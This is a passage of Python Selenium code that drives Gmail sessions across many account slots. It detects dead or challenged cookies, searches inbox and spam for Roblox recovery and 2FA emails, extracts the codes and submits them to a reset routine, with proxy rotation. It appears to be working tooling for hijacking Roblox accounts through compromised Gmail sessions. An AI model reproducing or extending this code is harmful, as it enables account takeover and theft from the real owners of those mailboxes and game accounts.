        return title_email

    dom_email = driver.execute_script(

        r"""
        const re = /[\w.+-]+@gmail\.com/i;
        for (const sel of ['[email]', '[data-hovercard-id]', '[data-email]', 'a[href*="@gmail.com"]']) {
            for (const el of document.querySelectorAll(sel)) {
                const s = el.getAttribute('email') || el.getAttribute('data-hovercard-id')
                    || el.getAttribute('data-email') || el.getAttribute('href') || '';
                const m = s.match(re);
                if (m) return m[0].toLowerCase();
            }
        }
        const hdr = document.querySelector('div.ha, header');
        if (hdr) {
            const m = (hdr.innerText || '').match(re);
            if (m) return m[0].toLowerCase();
        }
        return null;
        """

    )

    if dom_email:

        return str(dom_email).lower()

    if fallback:

        return fallback.strip().lower()

    return None

def extract_email_inbox_roundtrip(

    driver,

    wait: WebDriverWait,

    auth: str,

    rows: list[dict] | None = None,

    *,

    fallback: str | None = None,

) -> str | None:

    inbox_url = f"https://mail.google.com/mail/u/{auth}/#inbox"

    cur = (driver.current_url or "").lower()

    if f"/mail/u/{auth}/" not in cur or "#inbox" not in cur:

        driver.get(inbox_url)

        time.sleep(0.35)

    return extract_gmail_from_page(driver, fallback=fallback)

def dump_page_debug(driver, dump_dir: Path, tag: str) -> Path:

    dump_dir.mkdir(parents=True, exist_ok=True)

    ts = int(time.time())

    base = dump_dir / f"{tag}_{ts}"

    url = ""

    title = ""

    body_text = ""

    try:

        url = driver.current_url or ""

        title = driver.title or ""

    except Exception:

        pass

    try:

        body_text = driver.execute_script(

            r"return document.body ? (document.body.innerText || '').slice(0, 8000) : '';"

        ) or ""

        (base.with_suffix(".txt")).write_text(body_text, encoding="utf-8")

    except Exception:

        pass

    try:

        (base.with_suffix(".html")).write_text(driver.page_source or "", encoding="utf-8")

    except Exception:

        pass

    meta = {"url": url, "title": title, "snippet": body_text[:500]}

    (base.with_suffix(".json")).write_text(json.dumps(meta, indent=2), encoding="utf-8")

    return base

def diagnose_gmail(driver) -> dict:

    url = ""

    title = ""

    body = ""

    try:

        url = driver.current_url or ""

        title = driver.title or ""

        body = driver.execute_script(

            r"return document.body ? (document.body.innerText || '').slice(0, 4000) : '';"

        ) or ""

    except Exception as e:

        return {"ok": False, "reason": f"driver_error:{e}", "url": url, "title": title}

    low = f"{url}\n{title}\n{body}".lower()

    if "accounts.google.com/cookiemismatch" in low:

        return {"ok": False, "reason": "cookiemismatch", "url": url, "title": title}

    dead_markers = (

        "verify it's you",

        "verify it’s you",

        "sign in again",

        "couldn't sign you in",

        "account has been disabled",

        "confirm your identity",

        "unusual activity",

        "подтвердите, что это вы",

        "войдите снова",

    )

    for m in dead_markers:

        if m in low:

            return {"ok": False, "reason": f"verify_screen:{m}", "url": url, "title": title}

    if "accounts.google.com/v3/signin" in low or "accounts.google.com/signin" in low:

        return {"ok": False, "reason": "signin_redirect", "url": url, "title": title}

    if "mail.google.com" in url and "inbox" in url:

        rows = 0

        try:

            rows = len(extract_recent_inbox_messages(driver, 3, "inbox"))

        except Exception:

            pass

        if rows == 0 and "loading" in body.lower()[:200]:

            return {"ok": False, "reason": "inbox_loading_stuck", "url": url, "title": title}

        return {"ok": True, "reason": "inbox_ok", "url": url, "title": title, "rows": rows}

    if "mail.google.com" in url:

        return {"ok": True, "reason": "mail_google", "url": url, "title": title}

    return {"ok": False, "reason": f"unknown_page", "url": url, "title": title}

def extract_gmail_from_title(title: str) -> str | None:

    m = re.search(r"[\w.+-]+@gmail\.com", title or "", re.I)

    return m.group(0).lower() if m else None

def count_roblox_letters(rows: list[dict]) -> int:

    return sum(

        1

        for m in rows

        if is_roblox_letter(m.get("from", ""), m.get("subject", ""))

    )

def _is_fatal_gmail_dead(reason: str) -> bool:

    if not reason.startswith("GMAIL_DEAD:"):

        return False

    sub = reason[len("GMAIL_DEAD:") :]

    if sub == "signin_redirect":

        return True

    return sub.startswith("verify_screen")

def verify_gmail_roblox_slot(

    driver,

    wait: WebDriverWait,

    auth: str,

    *,

    expected_email: str | None = None,

    inbox_limit: int = INBOX_LIMIT,

) -> tuple[bool, str, str, list[dict], str]:

    auth = str(auth or "0")

    driver.get(f"https://mail.google.com/mail/u/{auth}/#inbox")

    wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    time.sleep(0.6)

    url = driver.current_url or ""

    if "accounts.google.com" in url:

        diag = diagnose_gmail(driver)

        if not diag.get("ok"):

            return False, auth, "", [], f"GMAIL_DEAD:{diag.get('reason', 'unknown')}"

    wait_gmail_ready(driver, 12.0)

    diag = diagnose_gmail(driver)

    if not diag.get("ok"):

        return False, auth, "", [], f"GMAIL_DEAD:{diag.get('reason', 'unknown')}"

    _, auth_u = snapshot_gmail_location(driver)

    if auth_u is not None:

        auth = str(auth_u)

    actual = extract_gmail_from_page(driver, fallback=expected_email)

    if not actual:

        actual = extract_gmail_from_title(diag.get("title") or driver.title or "")

    merged = fetch_roblox_mail_rows(

        driver, wait, auth, ROBLOX_MAIL_LIMIT, gentle=True, log=None

    )

    rbx_n = count_roblox_letters(merged)

    if expected_email:

        exp = expected_email.strip().lower()

        if actual and actual != exp:

            return False, auth, actual, merged, ""

        if not actual:

            actual = exp

    if rbx_n < 1:

        slot = actual or expected_email or f"u{auth}"

        return False, auth, actual or "", merged, f"NO_ROBLOX_MAIL:{slot}"

    email_out = actual or (expected_email or "").strip().lower()

    return True, auth, email_out, merged, ""

def _looks_like_email(value: str | None) -> bool:

    s = (value or "").strip().lower()

    if not s or "@" not in s:

        return False

    local, _, domain = s.partition("@")

    return bool(local and domain and "." in domain)

def resolve_gmail_auth_for_email(

    driver,

    wait: WebDriverWait,

    expected_email: str,

    *,

    prefer_auth: str = "0",

    log: Callable[[str], None] | None = None,

) -> tuple[str | None, str, list[dict], str]:

    _log = log or (lambda _m: None)

    email_filter = (

        expected_email.strip().lower()

        if _looks_like_email(expected_email)

        else None

    )

    prefer = str(prefer_auth or "0")

    order = [prefer] + [str(u) for u in range(10) if str(u) != prefer]

    visited_out: set[str] = set()

    last_reason = (

        f"NO_ROBLOX_MAIL:{email_filter}" if email_filter else "NO_ROBLOX_MAIL"

    )

    last_actual = ""

    last_merged: list[dict] = []

    for auth in order:

        requested = int(auth) if auth.isdigit() else 0

        ok, auth_out, actual, merged, reason = verify_gmail_roblox_slot(

            driver, wait, auth, expected_email=email_filter

        )

        rbx = count_roblox_letters(merged)

        mismatch = bool(email_filter and actual and actual.lower() != email_filter)

        extra = ""

        if mismatch and not ok:

            extra = f" wrong_email={actual}"

        elif reason:

            extra = f" {reason}"

        _log(

            f"gmail slot u{auth}→u{auth_out} email={actual or '-'} "

            f"roblox={rbx} ok={ok}{extra}"

        )

        if ok:

            return auth_out, actual, merged, ""

        last_actual = actual or last_actual

        if merged:

            last_merged = merged

        if reason:

            last_reason = reason

        if reason and reason.startswith("GMAIL_DEAD"):

            if _is_fatal_gmail_dead(reason):

                _log("gmail cookie dead (signin/verify) — abort slot scan")

                break

            if requested >= 1 and auth_out == "0":

                _log(f"gmail slot u{auth}→u0 — конец аккаунтов")

                break

            continue

        if requested >= 1 and auth_out == "0":

            _log(f"gmail slot u{auth}→u0 — конец аккаунтов")

            break

        if auth_out in visited_out:

            continue

        visited_out.add(auth_out)

    if not last_actual and not email_filter:

        last_reason = "NO_EMAIL"

    return None, last_actual, last_merged, last_reason

def count_recovery_candidates(

    rows: list[dict],

    baseline_ms: int,

    seen: set[str],

    min_ms: int = 0,

    *,

    reset_ms: int = 0,

    known_ids: set[str] | None = None,

) -> list[dict]:

    out = []

    for msg in rows:

        if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            continue

        blob = _row_blob(msg)

        if not is_recovery_code_letter(msg.get("subject", ""), blob):

            continue

        tms = msg_list_time_ms(msg)

        subj = (msg.get("subject") or "").strip()

        is_new = tms > baseline_ms or (subj and subj not in seen)

        if min_ms and tms and tms < min_ms:

            is_new = False

        usable = _row_usable_recovery(

            msg, reset_ms=reset_ms, known_ids=known_ids, min_ms=min_ms

        )

        out.append({**msg, "_tms": tms, "_new": is_new, "_usable": usable})

    return out

def dump_thread_page(driver, dump_dir: Path, tag: str) -> Path:

    dump_dir.mkdir(parents=True, exist_ok=True)

    ts = int(time.time())

    base = dump_dir / f"{tag}_{ts}"

    try:

        (base.with_suffix(".html")).write_text(driver.page_source or "", encoding="utf-8")

    except Exception:

        pass

    try:

        body = driver.execute_script(

            r"""
            const el = document.querySelector('div.a3s');
            return el ? (el.innerText || '') : (document.body ? document.body.innerText.slice(0,20000) : '');
            """

        )

        (base.with_suffix(".txt")).write_text(str(body or ""), encoding="utf-8")

    except Exception:

        pass

    meta = {"url": driver.current_url, "title": driver.title}

    (base.with_suffix(".json")).write_text(json.dumps(meta, indent=2), encoding="utf-8")

    return base.with_suffix(".html")

def gmail_inbox_poll_reload(

    driver,

    wait: WebDriverWait,

    *,

    after_sleep: float,

    auth: str = "0",

    gentle: bool = False,

) -> None:

    time.sleep(after_sleep)

    if gentle:

        return

    try:

        driver.get(f"https://mail.google.com/mail/u/{auth}/#spam")

        try:

            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        except Exception:

            pass

        time.sleep(0.35)

        driver.get(f"https://mail.google.com/mail/u/{auth}/#inbox")

        try:

            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        except Exception:

            pass

        time.sleep(0.35)

    except Exception:

        pass

def poll_roblox_code(

    driver,

    wait: WebDriverWait,

    auth: str,

    baseline_ms: int,

    seen_subjects: set[str],

    *,

    min_ms: int = 0,

    reset_ms: int = 0,

    known_ids: set[str] | None = None,

    skip_codes: set[str] | None = None,

    dump_dir: Path | None = None,

    log=None,

    timeout_s: float = 0,

    gentle: bool = True,

    spam_every: int = 6,

) -> tuple[str | None, str, str]:

    global _last_poll_abort_reason

    _last_poll_abort_reason = ""

    inbox_url = f"https://mail.google.com/mail/u/{auth}/#inbox"

    driver.get(inbox_url)

    time.sleep(0.35)

    max_attempts = POLL_ATTEMPTS

    if timeout_s > 0:

        max_attempts = max(POLL_ATTEMPTS, int(timeout_s / POLL_SLEEP_S))

    if reset_ms:

        max_attempts = min(max_attempts, 12)

    skip = set(skip_codes or ())

    poll_gentle = gentle if not reset_ms else False

    no_usable_streak = 0

    for attempt in range(1, max_attempts + 1):

        try:

            diag0 = diagnose_gmail(driver)

            if not diag0.get("ok") and diag0.get("reason") == "cookiemismatch":

                _last_poll_abort_reason = "GMAIL_DEAD:cookiemismatch"

                if log:

                    from retriever_shared.bind.bind_debug import stage_log

                    stage_log(log, "poll", f"abort: {_last_poll_abort_reason}")

                break

        except Exception:

            pass

        include_spam = bool(reset_ms) or attempt == 1 or (

            spam_every > 0 and attempt % spam_every == 0

        )

        merged = fetch_roblox_mail_rows(

            driver,

            wait,

            auth,

            ROBLOX_MAIL_LIMIT,

            include_spam=include_spam,

            gentle=poll_gentle,

            expected_min=0 if reset_ms else 1,

            log=log,

        )

        try:

            diag1 = diagnose_gmail(driver)

            if not diag1.get("ok") and diag1.get("reason") == "cookiemismatch":

                _last_poll_abort_reason = "GMAIL_DEAD:cookiemismatch"

                if log:

                    from retriever_shared.bind.bind_debug import stage_log

                    stage_log(log, "poll", f"abort: {_last_poll_abort_reason}")

                break

        except Exception:

            pass

        if reset_ms and include_spam and attempt == 1:

            try:

                spam_recovery = fetch_spam_recovery_search_rows(

                    driver, wait, auth, min(ROBLOX_MAIL_LIMIT, 25), log=log

                )

                spam_recovery_fresh = [

                    m

                    for m in spam_recovery

                    if (

                        (msg_list_time_ms(m) and msg_list_time_ms(m) >= reset_ms - 10_000)

                        or (

                            known_ids is not None

                            and (m.get("mailId") or "").strip()

                            and (m.get("mailId") or "").strip() not in known_ids

                        )

                    )

                ]

                if spam_recovery_fresh:

                    merged = dedupe_inbox_rows_by_mail_id(spam_recovery_fresh + merged)

            except Exception:

                pass

        cands = count_recovery_candidates(

            merged,

            baseline_ms,

            seen_subjects,

            min_ms=min_ms,

            reset_ms=reset_ms,

            known_ids=known_ids,

        )

        if log:

            from retriever_shared.bind.bind_debug import stage_log

            usable = [c.get("subject", "")[:40] for c in cands if c.get("_usable")]

            skipped = [

                (c.get("subject") or "")[:35]

                for c in cands

                if is_recovery_code_letter(

                    c.get("subject", ""),

                    f"{c.get('subject', '')}\n{c.get('snippet', '')}",

                )

                and not c.get("_usable")

            ][:3]

            extra = f" skipped={skipped}" if skipped and not usable else ""

            stage_log(

                log,

                "poll",

                f"#{attempt}/{max_attempts} rows={len(merged)} recovery={len(cands)} "

                f"usable={usable} spam={include_spam} gentle={poll_gentle}{extra}",

            )

        if reset_ms:

            usable_rows = [c for c in cands if c.get("_usable")]

            fresh_recovery = any(

                (

                    msg_list_time_ms(m) >= reset_ms - 10_000

                    or (

                        known_ids is not None

                        and (m.get("mailId") or "").strip()

                        and (m.get("mailId") or "").strip() not in known_ids

                    )

                )

                for m in merged

                if is_roblox_letter(m.get("from", ""), m.get("subject", ""))

                and is_recovery_code_letter(m.get("subject", ""), _row_blob(m))

            )

            fresh_notification = any(

                is_2fa_status_notification_letter(

                    (m.get("subject") or ""), _row_blob(m)

                )

                and msg_list_time_ms(m) >= reset_ms - 10_000

                for m in merged

            )

            if not usable_rows:

                no_usable_streak += 1

            else:

                no_usable_streak = 0

            if no_usable_streak >= 3 and fresh_notification and not fresh_recovery:

                _last_poll_abort_reason = "WRONG_LETTER:2fa_enabled_notification_only"

                if log:

                    stage_log(

                        log,

                        "poll",

                        f"abort: {_last_poll_abort_reason} — "

                        "новое письмо только про включённый 2FA, recovery-кода нет",

                    )

                break

            if no_usable_streak >= 6 and not fresh_recovery:

                spam_only = fetch_spam_search_rows(

                    driver, wait, auth, ROBLOX_MAIL_LIMIT, log=log

                )

                if spam_only:

                    thr_code, thr_body, thr_html = try_open_recovery_threads(

                        driver,

                        wait,

                        auth,

                        spam_only,

                        is_recovery_code_letter,

                        known_ids=known_ids,

                        reset_ms=reset_ms,

                        min_ms=min_ms,

                        skip_codes=skip,

                        log=log,

                        dump_dir=dump_dir,

                        max_threads=4,

                    )

                    if thr_code and thr_code not in skip:

                        if log:

                            log(f"code {thr_code} from spam-search fallback poll #{attempt}")

                        return thr_code, thr_body, thr_html

                _last_poll_abort_reason = "STALE_INBOX:no_fresh_recovery_after_reset"

                if log:

                    stage_log(

                        log,

                        "poll",

                        f"abort: {_last_poll_abort_reason} — "

                        f"poll #{attempt}, открытие старых писем бессмысленно",

                    )

                break

        if reset_ms:

            spam_rows = [m for m in merged if (m.get("_box") or "") == "spam"]

            for thr_rows in (spam_rows, merged) if spam_rows else (merged,):

                thr_code, thr_body, thr_html = try_open_recovery_threads(

                    driver,

                    wait,

                    auth,

                    thr_rows,

                    is_recovery_code_letter,

                    known_ids=known_ids,

                    reset_ms=reset_ms,

                    min_ms=min_ms,

                    skip_codes=skip,

                    log=log,

                    dump_dir=dump_dir,

                    max_threads=6,

                )

                if thr_code and thr_code not in skip:

                    if log:

                        src = "spam" if thr_rows is spam_rows else "merged"

                        log(f"code {thr_code} from recovery thread ({src}) poll #{attempt}")

                    return thr_code, thr_body, thr_html

        if reset_ms:

            picked = pick_usable_recovery_letter(

                merged,

                reset_ms=reset_ms,

                known_ids=known_ids,

                min_ms=min_ms,

            )

            if not picked:

                fresh = _pick_fresh_recovery_rows(

                    merged,

                    reset_ms=reset_ms,

                    min_ms=min_ms,

                    known_ids=known_ids,

                )

                if fresh:

                    picked = fresh[0]

                    if log:

                        subj = (picked.get("subject") or "")[:40]

                        tms = msg_list_time_ms(picked)

                        log(

                            f"poll #{attempt}: fresh recovery row {subj} "

                            f"tms={tms} min_ms={min_ms}"

                        )

        else:

            picked = pick_roblox_code_letter(

                merged, baseline_ms, seen_subjects, min_ms=min_ms

            )

        if picked:

            snippet_blob = _row_blob(picked)

            row_tms = msg_list_time_ms(picked)

            snippet_code = try_code_from_row_snippet(picked)

            body, html = "", ""

            snippet_stale = bool(

                snippet_code

                and (

                    snippet_code in skip

                    or (

                        reset_ms

                        and row_tms

                        and min_ms

                        and row_tms < min_ms

                    )

                )

            )

            if snippet_code and not snippet_stale:

                if log:

                    log(f"code {snippet_code} from snippet poll #{attempt}")

                code = snippet_code

                full = snippet_blob

            else:

                if log:

                    why = "stale snippet" if snippet_stale else "no snippet code"

                    log(f"poll #{attempt}: open letter ({why})")

                body, html = open_thread(

                    driver,

                    wait,

                    picked,

                    auth,

                    log=log,

                    dump_dir=dump_dir,

                    expand=bool(reset_ms),

                )

                full = f"{picked.get('subject', '')}\n{body}\n{html}"

                code = extract_verification_code(full)

                if code and code in skip:

                    if log:

                        log(f"poll #{attempt}: skip used code {code}")

                    code = None

            if dump_dir and code:

                tag = f"roblox_{picked.get('subject', 'letter')[:40].replace('/', '_')}"

                dump_path = dump_dir / f"{tag}_{attempt}"

                dump_path.parent.mkdir(parents=True, exist_ok=True)

                dump_path.with_suffix(".txt").write_text(full, encoding="utf-8")

                if html or body:

                    dump_path.with_suffix(".html").write_text(html or body, encoding="utf-8")

            if code:

                if log and body:

                    log(f"code {code} poll #{attempt}")

                return code, body or snippet_blob, html

        if reset_ms or not picked:

            has_stacks = any(row_stack_count(m) >= 1 for m in merged)

            if has_stacks or reset_ms:

                stack_code, stack_body, stack_html = try_codes_from_stacked_threads(

                    driver,

                    wait,

                    auth,

                    merged,

                    is_recovery_code_letter,

                    min_ms=min_ms,

                    baseline_ms=baseline_ms,

                    seen_subjects=seen_subjects,

                    log=log,

                    dump_dir=dump_dir,

                    skip_codes=skip,

                    send_after_ms=reset_ms or min_ms,

                    max_threads=5 if reset_ms else 3,

                )

                if stack_code and stack_code not in skip:

                    if log:

                        log(f"code {stack_code} from stack poll #{attempt}")

                    return stack_code, stack_body, stack_html

        if log and attempt % 4 == 0:

            log(f"poll #{attempt}/{max_attempts}")

        if attempt < max_attempts:

            diag = diagnose_gmail(driver)

            if not diag.get("ok"):

                if log:

                    log(f"poll stop: {diag.get('reason')}")

                break

            gmail_inbox_poll_reload(

                driver,

                wait,

                after_sleep=POLL_SLEEP_S,

                auth=auth,

                gentle=poll_gentle,

            )

    if dump_dir and log:

        dump_page_debug(driver, dump_dir, "poll_exhausted")

    return None, "", ""

def _empty_2fa_snap() -> dict:

    return {

        "codes": set(),

        "rejected": set(),

        "msg_ids": set(),

        "max_list_tms": 0,

        "send_after_ms": 0,

        "n_parts": 0,

        "list_tms": 0,

        "stack_count": 0,

        "last_msg_id": "",

    }

def _twofa_poll_skip(twofa_snap: dict | None, skip_codes: set[str] | None) -> set[str]:

    snap = twofa_snap or {}

    if snap.get("send_after_ms"):

        return set(snap.get("rejected") or ())

    skip = set(skip_codes or ())

    skip.update(snap.get("codes", set()))

    return skip

def collect_codes_from_blob(blob: str) -> set[str]:

    if not blob:

        return set()

    return {

        m.group(1)

        for m in CODE_ALL_RE.finditer(blob)

        if m.group(1) != "000000"

    }

def snapshot_all_roblox_codes(

    driver,

    wait: WebDriverWait,

    auth: str,

    pred,

    *,

    log=None,

) -> dict:

    _log = log or (lambda _m: None)

    snap = _empty_2fa_snap()

    try:

        merged = fetch_roblox_mail_rows(driver, wait, str(auth or "0"), ROBLOX_MAIL_LIMIT)

        for msg in merged:

            if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

                continue

            blob = _row_blob(msg)

            if pred and not pred(msg.get("subject", ""), blob):

                continue

            snap["codes"].update(collect_codes_from_blob(blob))

            mid = (msg.get("mailId") or "").strip()

            if mid:

                snap["msg_ids"].add(mid)

            tms = msg_list_time_ms(msg)

            snap["max_list_tms"] = max(snap["max_list_tms"], tms)

            stack_n = row_stack_count(msg)

            snap["stack_count"] = max(snap["stack_count"], stack_n)

            if stack_n >= 2:

                snap["n_parts"] = max(snap["n_parts"], stack_n)

        _log(f"snapshot_2fa codes={len(snap['codes'])} msg_ids={len(snap['msg_ids'])}")

    except Exception as exc:

        _log(f"snapshot_2fa error: {exc}")

    return snap

def poll_gmail_roblox_letter(

    driver,

    wait: WebDriverWait,

    auth: str,

    baseline_ms: int,

    seen_subjects: set[str],

    pred,

    *,

    min_ms: int = 0,

    dump_dir: Path | None = None,

    dump_tag: str = "letter",

    log=None,

    gentle: bool = True,

    spam_every: int = 6,

    expected_email: str | None = None,

    timeout_s: float = 0,

    latest_only: bool = False,

    twofa_snap: dict | None = None,

    skip_codes: set[str] | None = None,

    open_deep: bool = False,

) -> tuple[str | None, str, str]:

    auth = str(auth or "0")

    skip = _twofa_poll_skip(twofa_snap, skip_codes)

    send_after_ms = int((twofa_snap or {}).get("send_after_ms") or 0)

    if expected_email:

        ok, auth, _, _, reason = verify_gmail_roblox_slot(

            driver, wait, auth, expected_email=expected_email

        )

        if not ok:

            if log:

                log(f"{dump_tag} gmail check failed: {reason}")

            return None, "", ""

    else:

        driver.get(f"https://mail.google.com/mail/u/{auth}/#inbox")

        time.sleep(0.35)

        merged = fetch_roblox_mail_rows(driver, wait, auth, ROBLOX_MAIL_LIMIT)

        if count_roblox_letters(merged) < 1:

            if log:

                log(f"{dump_tag} NO_ROBLOX_MAIL on u{auth}")

            return None, "", ""

    max_attempts = POLL_ATTEMPTS

    if timeout_s > 0:

        max_attempts = max(POLL_ATTEMPTS, int(timeout_s / POLL_SLEEP_S))

    for attempt in range(1, max_attempts + 1):

        include_spam = attempt == 1 or (spam_every > 0 and attempt % spam_every == 0)

        merged = fetch_roblox_mail_rows(

            driver,

            wait,

            auth,

            ROBLOX_MAIL_LIMIT,

            log=log,

        )

        letter_rows = list_roblox_letter_pred(

            merged, baseline_ms, seen_subjects, pred, min_ms=min_ms

        )

        if latest_only and letter_rows:

            letter_rows = letter_rows[:3]

        for picked in letter_rows or [None]:

            if not picked:

                break

            subj = (picked.get("subject") or "").strip()

            tms = msg_list_time_ms(picked)

            snippet_code = try_code_from_row_snippet(picked)

            if send_after_ms and list_tms_stale(tms, send_after_ms):

                if not (snippet_code and snippet_code not in skip):

                    if log:

                        log(

                            f"{dump_tag} skip old letter tms={tms}<{send_after_ms} "

                            f"(slack={GMAIL_LIST_TMS_SLACK_MS}ms)"

                        )

                    continue

            snippet_blob = _row_blob(picked)

            if log:

                log(f"{dump_tag} open thread: {subj[:50]}")

            body, html = open_thread(

                driver,

                wait,

                picked,

                auth,

                log=log,

                dump_dir=dump_dir,

                expand=True,

            )

            full = f"{subj}\n{body}\n{html}"

            code = _pick_fresh_thread_code(

                subj,

                body,

                html,

                pred,

                skip_codes=skip,

                twofa_snap=twofa_snap,

                send_after_ms=send_after_ms,

            )

            if dump_dir and (body or html or snippet_blob):

                safe = dump_tag[:40].replace("/", "_")

                p = dump_dir / f"{safe}_{attempt}"

                p.parent.mkdir(parents=True, exist_ok=True)

                dump_text = (

                    f"{subj}\n{body}\n{html}" if body or html else snippet_blob

                )

                p.with_suffix(".txt").write_text(dump_text, encoding="utf-8")

                if html or body:

                    p.with_suffix(".html").write_text(html or body, encoding="utf-8")

            if code and log:

                log(f"{dump_tag} code {code} poll #{attempt}")

            if code:

                return code, body or snippet_blob, html

        if not letter_rows:

            stack_code, stack_body, stack_html = try_codes_from_stacked_threads(

                driver,

                wait,

                auth,

                merged,

                pred,

                min_ms=min_ms,

                baseline_ms=baseline_ms,

                seen_subjects=seen_subjects,

                log=log,

                dump_dir=dump_dir,

                skip_codes=skip,

                max_threads=3,

                twofa_snap=twofa_snap,

                send_after_ms=send_after_ms,

            )

            if stack_code:

                if log:

                    log(f"{dump_tag} code {stack_code} from stack poll #{attempt}")

                return stack_code, stack_body, stack_html

        if log and attempt % 4 == 0:

            log(f"{dump_tag} poll #{attempt}/{max_attempts}")

        if attempt < max_attempts:

            diag = diagnose_gmail(driver)

            if not diag.get("ok"):

                if log:

                    log(f"{dump_tag} poll stop: {diag.get('reason')}")

                break

            gmail_inbox_poll_reload(

                driver, wait, after_sleep=POLL_SLEEP_S, auth=auth, gentle=gentle

            )

    return None, "", ""

def extract_all_codes(text: str) -> list[str]:

    if not text:

        return []

    seen: set[str] = set()

    out: list[str] = []

    for m in CODE_ALL_RE.finditer(text):

        c = m.group(1)

        if c not in seen:

            seen.add(c)

            out.append(c)

    return out

def extract_roblox_codes(text: str) -> list[str]:

    if not text:

        return []

    found: list[str] = []

    seen: set[str] = set()

    for line in text.splitlines():

        low = line.lower()

        if not any(

            x in low

            for x in (

                "roblox",

                "security code",

                "recovery",

                "password reset",

                "kod",

                "código",

            )

        ):

            continue

        for m in CODE_ALL_RE.finditer(line):

            c = m.group(1)

            if c not in seen and c != "000000":

                seen.add(c)

                found.append(c)

    if found:

        return found

    c = extract_verification_code(text)

    return [c] if c else []

def verify_recovery_codes(

    resetter,

    sid: str,

    text: str,

    log=None,

    used_codes: set[str] | None = None,

    *,

    code: str | None = None,

) -> str | None:

    if code:

        codes = [code]

    else:

        codes = list(reversed(extract_roblox_codes(text)))

        if not codes:

            c = extract_verification_code(text)

            if c:

                codes = [c]

    for c in codes:

        if used_codes is not None:

            used_codes.add(c)

        if resetter.verify_code(sid, c):

            if log:

                log(f"verify OK code={c}")

            return c

        if log:

            log(f"verify fail code={c}")

    return None

class ProxyRotator:

    def __init__(self, proxies: list[dict[str, str]], start: int = 0):

        self.proxies = proxies

        self.idx = start

    def next(self) -> dict[str, str] | None:

        if not self.proxies:

            return None

        p = self.proxies[self.idx % len(self.proxies)]

        self.idx += 1

        return p
